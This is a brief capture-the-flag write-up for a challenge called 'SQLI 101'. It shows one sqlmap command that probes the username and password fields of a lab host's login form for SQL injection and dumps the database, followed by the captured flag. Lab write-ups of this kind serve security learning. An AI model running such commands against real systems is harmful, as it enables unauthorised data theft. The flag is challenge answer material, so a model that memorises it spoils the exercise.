# SQLI 101
Used sqlmap to bruteforce it using username and password parameters   
``sqlmap -u http://chal4.hackademy.ctf --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ``   
``FLAG-VTjo1lpqGRcHdtD5r02e73Dq4jrnusXn``
